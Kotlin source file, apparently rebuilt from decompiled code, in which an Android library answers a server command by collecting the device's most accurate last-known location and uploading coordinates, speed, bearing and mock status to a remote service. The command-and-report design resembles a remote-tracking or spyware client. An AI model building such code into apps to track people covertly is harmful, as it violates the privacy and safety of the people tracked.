package com.hawkshaw.library.features.location

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.util.Log // Added for Android logging
import androidx.core.content.ContextCompat
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.models.PushLocationRequest
import com.hawkshaw.library.datalayer.models.PushLocationResponse
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import com.hawkshaw.library.datalayer.models.Location as LocationModel // Alias for clarity

private const val TAG = "LocationHandler"

/**
 * Push location data to server
 *
 * @param request Location request parameters (can be null, though not directly used for push logic here)
 * @return API response
 */
suspend fun pushLocation(request: Command.GetLocationRequest?): ApiResponse<PushLocationResponse> = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] pushLocation called with request: $request")
    try {
        Logger.d(TAG, "Pushing location data", false, 4, null)

        // Check location permissions
        val context = App.getContext()
        val hasPermission = hasLocationPermission(context)
        Log.d(TAG, "[DEBUG] Location permission check result: $hasPermission")
        if (!hasPermission) {
            Log.e(TAG, "[DEBUG] Location permission not granted. Returning error.")
            // Existing Logger.e is good.
            Logger.e(TAG, "Location permission not granted", null, false, 12, null)
            return@withContext ApiResponse.Error("Location permission not granted")
        }

        // Get location
        Log.d(TAG, "[DEBUG] Attempting to get last known location.")
        val location = getLastKnownLocation(context)
        Log.d(TAG, "[DEBUG] getLastKnownLocation returned: $location")

        if (location == null) {
            Log.e(TAG, "[DEBUG] Could not get last known location. Returning error.")
            // Existing Logger.e is good.
            Logger.e(TAG, "Could not get last known location", null, false, 12, null)
            return@withContext ApiResponse.Error("Could not get location")
        }

        // Create location model
        Log.d(TAG, "[DEBUG] Creating LocationModel from Android Location: $location")
        val locationModel = LocationModel(
            latitude = location.latitude,
            longitude = location.longitude,
            altitude = location.altitude,
            accuracy = location.accuracy,
            // Check Android version for verticalAccuracyMeters as it's API 31+
            verticalAccuracyMeters = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) location.verticalAccuracyMeters else 0.0f,
            speed = location.speed,
            bearing = location.bearing,
            provider = location.provider ?: "unknown",
            time = location.time,
            // Check Android version for isMock as it's API 31+
            isMock = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) location.isMock else location.isFromMockProvider
        )
        Log.d(TAG, "[DEBUG] Created LocationModel: $locationModel")

        // Create push request
        val pushRequest = PushLocationRequest(location = locationModel)
        Log.d(TAG, "[DEBUG] Created PushLocationRequest: $pushRequest")

        // Make API call
        // FIXED: Access Injector.INSTANCE instead of Injector.getInstance()
        Log.d(TAG, "[DEBUG] Making API call to push location.")
        val response = Injector.INSTANCE.locationService.pushLocation(pushRequest)
        Log.d(TAG, "[DEBUG] Push location API response state: ${response.state}")
        // Existing Logger.d is good.
        Logger.d(TAG, "Push location response: ${response.state}", false, 4, null)
        response
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] Error pushing location: ${e.message}", e)
        // Existing Logger.e is good.
        Logger.e(TAG, "Error pushing location", e, false, 12, null)
        ApiResponse.Error("Error pushing location: ${e.message}")
    }
}

/**
 * Check if location permissions (ACCESS_FINE_LOCATION or ACCESS_COARSE_LOCATION) are granted.
 *
 * @param context The application context.
 * @return True if at least one of the location permissions is granted, false otherwise.
 */
private fun hasLocationPermission(context: Context): Boolean {
    Log.d(TAG, "[DEBUG] hasLocationPermission called.")
    val fineLocationResult = ContextCompat.checkSelfPermission(
        context,
        Manifest.permission.ACCESS_FINE_LOCATION
    )
    val coarseLocationResult = ContextCompat.checkSelfPermission(
        context,
        Manifest.permission.ACCESS_COARSE_LOCATION
    )

    val fineLocation = fineLocationResult == PackageManager.PERMISSION_GRANTED
    val coarseLocation = coarseLocationResult == PackageManager.PERMISSION_GRANTED
    
    Log.d(TAG, "[DEBUG] Fine location permission: $fineLocation (Result code: $fineLocationResult)")
    Log.d(TAG, "[DEBUG] Coarse location permission: $coarseLocation (Result code: $coarseLocationResult)")

    val hasPermission = fineLocation || coarseLocation
    Log.d(TAG, "[DEBUG] Combined location permission granted: $hasPermission")
    return hasPermission
}

/**
 * Retrieves the last known location from available location providers.
 * It iterates through all enabled providers and returns the most accurate location found.
 *
 * @param context The application context.
 * @return The most accurate last known Location, or null if no location can be retrieved.
 */
private fun getLastKnownLocation(context: Context): Location? {
    Log.d(TAG, "[DEBUG] getLastKnownLocation called.")
    val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager

    // Get all enabled location providers
    val providers = locationManager.getProviders(true)
    Log.d(TAG, "[DEBUG] Enabled location providers: $providers")
    var bestLocation: Location? = null

    for (provider in providers) {
        Log.d(TAG, "[DEBUG] Checking provider: $provider")
        try {
            // Get the last known location for the current provider
            // Suppress "MissingPermission" warning as it's checked by hasLocationPermission()
            @Suppress("MissingPermission")
            val location = locationManager.getLastKnownLocation(provider)
            Log.d(TAG, "[DEBUG] Location from provider '$provider': $location")

            if (location == null) {
                Log.d(TAG, "[DEBUG] No location from provider '$provider', continuing.")
                continue
            }

            // Update bestLocation if the current location is null or more accurate
            if (bestLocation == null || location.accuracy < bestLocation.accuracy) {
                Log.d(TAG, "[DEBUG] New best location found from provider '$provider'. Old best: $bestLocation, New best: $location")
                bestLocation = location
            } else {
                Log.d(TAG, "[DEBUG] Location from provider '$provider' is not better than current best. Current best accuracy: ${bestLocation?.accuracy}, This location accuracy: ${location.accuracy}")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "[DEBUG] SecurityException getting location from $provider: ${e.message}", e)
            // Existing Logger.e is good.
            Logger.e(TAG, "SecurityException getting location from $provider", e, false, 12, null)
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error getting location from $provider: ${e.message}", e)
            // Existing Logger.e is good.
            Logger.e(TAG, "Error getting location from $provider", e, false, 12, null)
        }
    }
    Log.d(TAG, "[DEBUG] Final bestLocation determined: $bestLocation")
    return bestLocation
}

